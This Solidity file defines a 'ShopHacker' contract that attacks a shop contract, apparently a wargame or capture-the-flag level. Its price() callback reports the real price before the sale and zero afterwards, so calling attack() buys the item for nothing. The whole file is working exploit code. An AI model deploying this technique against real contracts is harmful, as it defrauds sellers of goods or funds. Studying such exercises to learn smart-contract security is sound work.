// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

interface IShop {
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
    function buy() external;
}

contract ShopHacker {
    IShop public shop;
    constructor(address target) {
        shop = IShop(target);
    }

    function price() external view returns (uint256) {
        if (shop.isSold()) {
            return 0;
        } else {
            return shop.price();
        }
    }

    function attack() public {
        shop.buy();
    }
}
